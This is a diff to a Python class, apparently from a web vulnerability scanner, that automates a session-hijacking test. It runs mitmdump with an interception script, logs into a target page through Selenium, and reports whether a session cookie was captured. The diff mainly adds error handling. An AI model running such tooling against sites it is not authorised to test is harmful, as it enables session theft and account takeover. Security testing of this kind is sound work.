@@ -31,28 +31,37 @@ class SessionHijackingAttack(Attack):
         subprocess.Popen(["nohup", "mitmdump", "-s", "mitm_scripts/mitm_session_hijacking.py"])
         with open('tmp_cookie.txt', 'w+') as f:
             f.write(self.cookie["name"])
-
         time.sleep(1)
-        wd.get(self.link)
-        wd.find_element_by_xpath("//input[@name='" + self.form_parameter["account"] + "']").send_keys(self.form_parameter["account_value"])
-        wd.find_element_by_xpath("//input[@name='" + self.form_parameter["password"] + "']").send_keys(self.form_parameter["password_value"])
-        wd.find_element_by_xpath("//input[@value='" + self.button + "']").click()
 
-        time.sleep(1)
-        if os.path.isfile("tmp_cookie_value.txt") and os.stat("tmp_cookie_value.txt").st_size > 0:
-            print "CONFIRMED: session hijacking attack successful."
-            exploit = {
-                "page": self.link,
-                "cookie": [{
-                    "name": self.cookie["name"],
-                    "secure": self.cookie["secure"],
-                    "httpOnly": self.cookie["httpOnly"],
-                    "attack": ["sessionHijacking"]
-                }]
-            }
-            self.phase4_output(exploit)
-        else:
-            print "CONFIRMED: session hijacking attack unsuccessful."
+        try:
+            wd.get(self.link)
+            wd.find_element_by_xpath("//input[@name='" + self.form_parameter["account"] + "']").send_keys(self.form_parameter["account_value"])
+            wd.find_element_by_xpath("//input[@name='" + self.form_parameter["password"] + "']").send_keys(self.form_parameter["password_value"])
+            if self.button == '//form//a[@class="button"]':
+                wd.find_element_by_xpath(self.button).click()
+            else:
+                try:
+                    wd.find_element_by_xpath("//input[@value='" + self.button + "']").click()
+                except NoSuchElementException:
+                    wd.find_element_by_xpath("//button[@value='" + self.button + "']").click()
+
+            time.sleep(1)
+            if os.path.isfile("tmp_cookie_value.txt") and os.stat("tmp_cookie_value.txt").st_size > 0:
+                print "CONFIRMED: session hijacking attack successful."
+                exploit = {
+                    "page": self.link,
+                    "cookie": [{
+                        "name": self.cookie["name"],
+                        "secure": self.cookie["secure"],
+                        "httpOnly": self.cookie["httpOnly"],
+                        "attack": ["sessionHijacking"]
+                    }]
+                }
+                self.phase4_output(exploit)
+            else:
+                print "CONFIRMED: session hijacking attack failed."
+        except NoSuchElementException:
+            print "ERROR: session hijacking attack failed."
         subprocess.Popen("kill $(ps -efw | grep mitmdump | grep -v grep | awk '{print $2}')", shell=True)
         subprocess.Popen("rm nohup.out", shell=True)
         subprocess.Popen("rm tmp_cookie.txt", shell=True)
